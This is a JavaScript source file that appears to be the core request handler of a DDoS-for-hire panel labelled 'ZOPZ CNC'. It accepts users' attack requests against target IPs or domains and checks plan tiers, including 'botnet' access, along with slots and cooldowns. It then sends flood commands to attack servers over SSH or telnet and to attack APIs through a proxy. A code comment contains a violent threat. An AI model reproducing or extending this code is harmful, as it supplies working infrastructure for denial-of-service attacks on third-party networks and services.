const fs = require('fs');
const path = require('path');
const axios = require('axios');
const net = require('net');
const { ProxyAgent } = require('proxy-agent');
const { Client } = require('ssh2');

if (typeof __dirname === 'undefined')
{
    global.__dirname = path.resolve();
}

eval(fs.readFileSync(path.join(__dirname, './utils/Info.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/AsyncQueue.js'), 'utf8'));

const blacklist = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/blacklist.json')));
const config    = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/main.json')));

const agent = new ProxyAgent('http://proxy.zopz-api.com:3128');

const activeGroupSlots = {};

//grabs the asn from ur api.
async function getASN(ip) {
  try {
    const res = await axios.get(`https://zopzsniff.xyz/geoip/${ip}`);
    const asn = res.data?.asn?.asn;
    return asn ? `ASnumber: AS${asn}` : null;
  } catch (error) {
    console.error(`Error fetching ASN for IP ${ip}:`, error.message);
    return null;
  }
}
function canUseGroupSlot(groupName, maxSlots) 
{
    if (!activeGroupSlots[groupName]) 
    {
        activeGroupSlots[groupName] = 0;
    }
    return activeGroupSlots[groupName] < maxSlots;
}

function markGroupSlotUsed(groupName) 
{
    activeGroupSlots[groupName] = (activeGroupSlots[groupName] || 0) + 1;
}

function releaseGroupSlot(groupName) 
{
    if (activeGroupSlots[groupName]) 
    {
        activeGroupSlots[groupName]--;
        if (activeGroupSlots[groupName] <= 0) 
        delete activeGroupSlots[groupName];
    }
}
class ApiHandler 
{
    constructor() 
    {
        this.methods = this.loadmethods();
        this.activeAttacks = new Map();
        this.cooldowns = new Map();
        this.userQueues = new Map();
    
        this.watchMethodFile();
    }
    
    getUserQueue(username) 
    {
      if (!this.userQueues.has(username)) 
      {
        this.userQueues.set(username, new AsyncQueue());
      }
      return this.userQueues.get(username);
  }

  async processRequest(method, params, user) {
  function isValidIp(ip) {
    if (typeof ip !== 'string') return false;
    const parts = ip.split('.');
    if (parts.length !== 4) return false;
    return parts.every(p => {
      const n = Number(p);
      return p.match(/^\d+$/) && n >= 0 && n <= 255;
    });
  }

  function getDomain(host) {
    try {
      let url = host;
      if (!host.startsWith('http')) url = 'http://' + host;
      const parsed = new URL(url);
      return parsed.hostname.toLowerCase();
    } catch {
      return null;
    }
  }

  function isValidNumber(value, min, max) {
    const n = Number(value);
    return Number.isInteger(n) && n >= min && n <= max;
  }

  return await this.getUserQueue(user.username).enqueue(async () => {
    if (!this.methods || typeof this.methods !== 'object') {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: attack methods not loaded`);
      return { error: 'attack methods not loaded\r' };
    }
    console.log(`[Queue] Processing request for user: ${user.username}`);
    const methodConfig = this.methods[method.toLowerCase()];

    if (!methodConfig || !methodConfig.enabled) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Method ${method} not found or disabled`);
      return { error: `Method ${method} not found or disabled\r` };
    }

    if (methodConfig.group) {
      const groupData = config.attack_settings.method_groups.find(g => g.name === methodConfig.group);
      if (groupData) {
        const groupName = groupData.name;
        const groupSlots = groupData.max_slots;
        if (!canUseGroupSlot(groupName, groupSlots)) {
          console.log(`[Queue] Failed request for user: ${user.username} - Reason: group ${groupName} slots full`);
          return { error: `The "${groupName}" methods group max attack slots are used (${groupSlots}).\r` };
        }

        markGroupSlotUsed(groupName);
        const attackDuration = parseInt(params.time, 10);
        if (isNaN(attackDuration) || attackDuration <= 0) {
          console.log(`[Queue] Failed request for user: ${user.username} - Reason: Invalid attack time`);
          releaseGroupSlot(groupName);
          return { error: `Invalid attack time specified.\r` };
        }
        setTimeout(() => {
          releaseGroupSlot(groupName);
        }, attackDuration * 1000);
      }
    }
    if (!params || typeof params !== 'object' || !params.host) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Invalid parameters`);
      return { error: 'Invalid parameters\r' };
    }
    let rawHost = params.host.trim();
    let sanitizedHost = rawHost.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    const hasIpFlag = Object.prototype.hasOwnProperty.call(methodConfig, 'ip_address');
    const hasUrlFlag = Object.prototype.hasOwnProperty.call(methodConfig, 'url');

    if (hasIpFlag || hasUrlFlag) {
      const allowIP = methodConfig.ip_address === true;
      const allowURL = methodConfig.url === true;
      const isIP = isValidIp(sanitizedHost);
      const isURL = !isIP && (() => {
        try {
          const parsed = new URL(rawHost.startsWith('http') ? rawHost : `http://${rawHost}`);
          return !!parsed.hostname;
        } 
        catch (_) 
        {
          return false;
        }
      })();

      if (!allowIP && isIP) {
        console.log(`[Queue] Failed request for user: ${user.username} - Reason: IP not allowed`);
        return { error: `Invalid target. This method does not allow IP addresses.\r` };
      }

      if (!allowURL && isURL) {
        console.log(`[Queue] Failed request for user: ${user.username} - Reason: URL not allowed`);
        return { error: `Invalid target. This method does not allow URLs/domains.\r` };
      }

      if (!isIP && !isURL) {
        console.log(`[Queue] Failed request for user: ${user.username} - Reason: Invalid target format`);
        return { error: `Invalid target. Not a valid IP or domain.\r` };
      }
    }

    if (isValidIp(sanitizedHost)) {
      if (blacklist.ip_address.includes(sanitizedHost) && !user.blacklistbypass) {
        console.log(`[Queue] Failed request for user: ${user.username} - Reason: Blacklisted IP ${sanitizedHost}`);
        return { error: `Host "${sanitizedHost}" is blacklisted\r` };
      }
      
      if (!isValidNumber(params.port, 1, 65535)) {
        console.log(`[Queue] Failed request for user: ${user.username} - Reason: Invalid port`);
        return { error: 'Invalid port number\r' };
      }
    } 

    else {
      if (methodConfig.url === false) {
        console.log(`[Queue] Failed request for user: ${user.username} - Reason: URL not allowed but got domain`);
        return { error: `Invalid target. This method does not allow URLs/domains.\r` };
      }

      const domain = getDomain(params.host);
      if (!domain) {
        console.log(`[Queue] Failed request for user: ${user.username} - Reason: Invalid domain`);
        return { error: 'Invalid domain\r' };
      }

      if (!user.blacklistbypass) {
        if (blacklist.domain[domain]) {
          console.log(`[Queue] Failed request for user: ${user.username} - Reason: Blacklisted domain ${params.host}`);
          return { error: `Host "${params.host}" is blacklisted\r` };
        }
        for (const t of blacklist.domain_type) {
          if (domain.endsWith(t)) {
            console.log(`[Queue] Failed request for user: ${user.username} - Reason: Blocked domain type`);
            return { error: 'Target domain type is blocked\r' };
          }
        }
      }
    }
    //blacklist asn, makes my life easy say the code is shit il rape you.
    const asn = await getASN(params.host);
    if (asn && blacklist.asn.includes(asn) && !user.blacklistbypass) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Blacklisted ASN ${asn} for IP ${params.host}`);
      return { error: `Target ASN (${asn}) is blacklisted\r` };
    }

    if (!isValidNumber(params.time, 1, user.maxTime)) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Invalid time`);
      return { error: `Time must be between 1 and ${user.maxTime} seconds\r` };
    }

    if (params.time > methodConfig.maxTime) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Time exceeds max allowed`);
      return { error: `Time exceeds maximum allowed (${methodConfig.maxTime}s)\r` };
    }

    if (params.time < methodConfig.min_time) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Time below min allowed`);
      return { error: `Time below minimum allowed (${methodConfig.min_time}s)\r` };
    }

    if (methodConfig.vip && !user.vip) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: User lacks VIP`);
      return { error: 'User doesn’t have VIP network!!\r' };
    }

    if (methodConfig.homeholder && !user.homeholder) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: User lacks Home Holder`);
      return { error: 'User doesn’t have Home Holder network!!\r' };
    }

    if (methodConfig.botnet && !user.botnet) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: User lacks botnet`);
      return { error: 'User doesn’t have botnet network!!\r' };
    }
    
    const cd = this.isOnCooldown(user.username, method);
    if (cd) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Cooldown ${cd.remaining}s`);
      return { error: `Cooldown active for ${method}. ${cd.remaining}s remaining\r` };
    }

    const sameHost = [...this.activeAttacks.values()].find(a => a.username === user.username && a.params.host === params.host);
    if (sameHost && !user.spambypass) {
      const rem = Math.ceil((sameHost.startTime + sameHost.params.time * 1000 - Date.now()) / 1000);
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Duplicate attack (${rem}s remaining)`);
      return { error: `Ongoing attack to ${params.host} in progress. ${rem}s remaining\r` };
    }

    const concurrentMethodCount = [...this.activeAttacks.values()].filter(a => a.username === user.username && a.method === method).length;
    if (concurrentMethodCount >= methodConfig.maxConcurrents) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Too many concurrent ${method}`);
      return { error: `Maximum concurrent reached (${methodConfig.maxConcurrents}) for ${method}\r` };
    }

    const concurrentCount = [...this.activeAttacks.values()].filter(a => a.username === user.username).length;
    if (concurrentCount >= user.concurrents) {
      console.log(`[Queue] Failed request for user: ${user.username} - Reason: Too many total concurrents`);
      return { error: `Maximum concurrent reached (${user.concurrents}) for ${user.username}\r` };
    }

    const requestId = Date.now().toString() + Math.random().toString(36).slice(2, 15);
    this.activeAttacks.set(requestId, {
      id: requestId,
      username: user.username,
      method,
      params,
      startTime: Date.now()
    });
    setTimeout(() => this.activeAttacks.delete(requestId), params.time * 1000);
    this.setCooldown(user, method, params.time);
    this.sendServerCommand(method, params).catch(e => console.error('ServerCmd Error:', e));
    this.sendApiCommand(method, params).catch(e => console.error('ApiCmd Error:', e));
    const targetDetails = await globalThis.getTargetDetails?.(params.host) || {};
    console.log(`[Queue] Successful request for user: ${user.username}`);
    return {
      success: true,
      requestId,
      target: {
        host: params.host,
        port: params.port,
        duration: params.time,
        method,
        time_sent: new Date().toISOString(),
        ...targetDetails
      }
    };
  });
}
    async sendServerCommand(method, params) 
    {
        let successCount = 0;
        const methodDef = this.methods?.[method];
        if (!methodDef || !Array.isArray(methodDef.servers)) 
        {
            return successCount;
        }
    
        const smIP = params.host.replace(/\./g, '');
        const IAC = 255, DO = 253, DONT = 254, WILL = 251, WONT = 252;
    
        const promises = methodDef.servers.map(server => new Promise(resolve => 
        {
            const command = server.command.replace(/\{\{(\w+)\}\}/g, (_, key) => (
            {
                session: smIP,
                host: params.host,
                port: params.port,
                time: params.time,
                len: params.len
            })[key] || '');
    
            console.log(`[${server.name}] Executing command: ${command}`);
    
            const portsToTry = Array.isArray(server.port) ? server.port : [server.port || (server.type === 'telnet' ? params.port : 22)];
    
            const tryNextPort = (index) => 
            {
                if (index >= portsToTry.length) 
                {
                    console.error(`[${server.name}] All ${server.type || 'ssh'} port attempts failed`);
                    return resolve(false);
                }
    
                const port = portsToTry[index];
    
                if (server.type === 'telnet') 
                {
                    const socket = new net.Socket();
                    let connected = false;
                    let sentUser = false, sentPass = false, sentCaptcha = false, sentCommand = false;
    
                    const cleanup = () => 
                    {
                        socket.removeAllListeners();
                        socket.destroy();
                    };
    
                    const globalTimeout = setTimeout(() => 
                    {
                        console.error(`[${server.name}] Telnet global timeout on port ${port}`);
                        cleanup();
                        tryNextPort(index + 1);
                    }, 10000);
    
                    socket.setNoDelay(true);
                    socket.setTimeout(5000);
    
                    socket.connect(port, server.host, () => 
                    {
                        connected = true;
                        console.log(`[${server.name}] Telnet connected on port ${port}`);
                        socket.write('\r\n');
                    });
    
                    socket.on('data', buffer => 
                    {
                        let i = 0;
                        while (i < buffer.length && buffer[i] === IAC && i + 2 < buffer.length) 
                        {
                            const cmd = buffer[i + 1], opt = buffer[i + 2];
                            if (cmd === DO) socket.write(Buffer.from([IAC, WONT, opt]));
                            if (cmd === WILL) socket.write(Buffer.from([IAC, DONT, opt]));
                            i += 3;
                        }
    
                        const txt = buffer.slice(i).toString('utf8')
                            .replace(/\u001b\[[0-9;]*[A-Za-z]/g, '')
                            .replace(/\u001b\][^\u0007]*\u0007/g, '');
    
                        if (sentCommand) 
                        {
                            console.log(`[${server.name}] ↩ ${txt.trimEnd()}`);
                            cleanup();
                            clearTimeout(globalTimeout);
                            return resolve(true);
                        }
    
                        if (!sentUser && txt.includes('Username:')) 
                        {
                            socket.write(`${server.username}\r\n`);
                            sentUser = true;
                        } 
                        else if (!sentPass && sentUser && txt.includes('Password:')) 
                        {
                            socket.write(`${server.password}\r\n`);
                            sentPass = true;
                        } 
                        else if (!sentCaptcha && sentPass && /Captcha/i.test(txt)) 
                        {
                            socket.write(`${params.captcha || server.captcha}\r\n`);
                            sentCaptcha = true;
                        } 
                        else if (!sentCommand && (txt.endsWith('> ') || txt.endsWith('$ ') || txt.endsWith('\r\n'))) 
                        {
                            socket.write(`${command}\r\n`);
                            sentCommand = true;
                        }
                    });
    
                    socket.on('timeout', () => 
                    {
                        console.error(`[${server.name}] Telnet timeout on port ${port}`);
                        cleanup();
                        clearTimeout(globalTimeout);
                        tryNextPort(index + 1);
                    });
    
                    socket.on('error', err => 
                    {
                        console.error(`[${server.name}] Telnet error on port ${port}: ${err.message}`);
                        cleanup();
                        clearTimeout(globalTimeout);
                        tryNextPort(index + 1);
                    });
    
                    socket.on('close', hadError => 
                    {
                        clearTimeout(globalTimeout);
                        cleanup();
                        if (connected && !hadError) 
                        {
                            console.log(`[${server.name}] Telnet session closed`);
                            return resolve(true);
                        } 
                        else if (!hadError) 
                        {
                            tryNextPort(index + 1);
                        } 
                        else
                        {
                            resolve(false);
                        }
                    });
    
                } 
                else 
                {
                    const conn = new Client();
                    let timeoutHandle = setTimeout(() => 
                    {
                        console.error(`[${server.name}] SSH global timeout on port ${port}`);
                        conn.end();
                        resolve(false);
                    }, 10000);
    
                    conn.on('ready', () => 
                    {
                        conn.exec(command, (err, stream) => 
                        {
                            if (err) 
                            {
                                console.error(`[${server.name}] SSH Exec Error: ${err.message}`);
                                conn.end();
                                clearTimeout(timeoutHandle);
                                return resolve(false);
                            }
                            stream.on('close', () => 
                            {
                                conn.end();
                                clearTimeout(timeoutHandle);
                                resolve(true);
                            }).on('data', data => 
                            {
                                console.log(`[${server.name}] STDOUT: ${data.toString().trim()}`);
                            }).stderr.on('data', data => 
                            {
                                console.error(`[${server.name}] STDERR: ${data.toString().trim()}`);
                            });
                        });
                    }).on('error', err => 
                    {
                        console.error(`[${server.name}] SSH Connection Error on port ${port}: ${err.message}`);
                        clearTimeout(timeoutHandle);
                        tryNextPort(index + 1);
                    }).on('end', () => 
                    {
                        clearTimeout(timeoutHandle);
                    }).connect(
                    {
                        host: server.host,
                        port,
                        username: server.username,
                        password: server.password
                    });
                }
            };
    
            tryNextPort(0);
        }));
        const results = await Promise.allSettled(promises);
        successCount = results.filter(r => r.status === 'fulfilled' && r.value === true).length;
        return successCount;
    }
    
    async sendApiCommand(method, params) 
    {
        let successCount = 0;
        const methodDef = this.methods?.[method];
        if (!methodDef || !Array.isArray(methodDef.urls)) 
        {
            //console.error(`Method '${method}' has no 'urls' array defined`);
            return successCount;
        }
        const { urls, error } = this.generateApiUrls(method, params);
        if (error) return 0;
        for (const url of urls) 
        {
            const start = Date.now();
            try
            {
                const res = await axios.get(url, 
                {
                    httpAgent: agent,
                    httpsAgent: agent,
                    timeout: 10000, 
                    headers: 
                    {
                        'User-Agent': 'Mozilla/5.0 (ZOPZ CNC) V4',
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    }
                });
                const duration = Date.now() - start;
                console.log(`--- API Response (${res.status === 200 ? "Success" : "Failure"}) ---`);
                console.log(`URL: ${url}`);
                console.log(`Status: ${res.status} ${res.statusText}`);
                console.log(`Body:`, res.data);
                if (res.status === 200) successCount++;
            } 
            catch (e) 
            {
                const duration = Date.now() - start;
                console.error(`--- API Request Failed ---`);
                console.error(`URL: ${url}`);
                console.error(`Error: ${e.message}`);
                if (axios.isCancel(e)) 
                {
                    console.error(`Request was canceled`);
                }
                if (e.response) 
                {
                    console.error(`Status: ${e.response.status}`);
                    console.error(`Body:`, e.response.data);
                }
            }
        }
        return successCount;
    }
    
    
    isValidIp = (ip) => /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)$/.test(ip);

    isValidNumber = (value, min, max) => 
    {
        const num = Number(value);
        return Number.isInteger(num) && num >= min && num <= max;
    };

    getDomain(targetUrl) 
    {
        try 
        {
            const parsedUrl = new URL(targetUrl);
            return parsedUrl.hostname;
        } 
        catch (error) 
        {
            return null;
        }
    }

    isOnCooldown(username, method) 
    {
        const key = `${username}:${method}`;
        const cooldown = this.cooldowns.get(key);
        if (!cooldown) return false;
        const now = Date.now();
        if (now < cooldown.endTime) 
        {
            return { remaining: Math.ceil((cooldown.endTime - now) / 1000) };
        }
        this.cooldowns.delete(key);
        return false;
    }

    setCooldown(user, method, duration)
    {
        if (user.cooldown == 0) return;
        const key = `${user.username}:${method}`;
        const endTime = Date.now() + (duration + user.cooldown) * 1000;
        this.cooldowns.set(key, { endTime });
    }

    generateApiUrls(method, params) 
    {
        const api = this.methods[method];
        if (!api || !api.enabled) 
        {
            return { error: `Endpoint "${endpoint}" not found or disabled` };
        }
        const { urls, maxConcurrents } = api;
        const generatedUrls = urls.map(urlObj => urlObj.url
                .replace('{host}', encodeURIComponent(params.host))
                .replace('{port}', encodeURIComponent(params.port))
                .replace('{time}', encodeURIComponent(params.time)));
        return { urls: generatedUrls, maxConcurrents };
    }

    loadmethods() 
    {
        this.methods = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/methods.json')));
    }
    
    watchMethodFile() 
{
    const configs = [
        { name: 'methods.json', target: 'methods' },
        { name: 'blacklist.json', target: 'blacklist' },
        { name: 'plans.json', target: 'plans' }
    ];

    configs.forEach(({ name, target }) => 
    {
        const filePath = path.join(__dirname, './configs/', name);
        let lastContent = '';

        fs.watchFile(filePath, { interval: 1000 }, (curr, prev) => 
        {
            if (curr.mtime === prev.mtime) return;

            fs.readFile(filePath, 'utf8', (err, data) => 
            {
                if (err) return console.error(`Failed to read ${name}:`, err.message);
                if (data === lastContent) return;
                try
                {
                    const parsed = JSON.parse(data);
                    this[target] = parsed;
                    lastContent = data;
                    console.log(`${name} reloaded successfully`);
                } 
                catch (err) 
                {
                    console.error(`Invalid JSON in ${name}, ignoring update:`, err.message);
                }
            });
        });
    });
}
};

globalThis.ApiHandler = ApiHandler;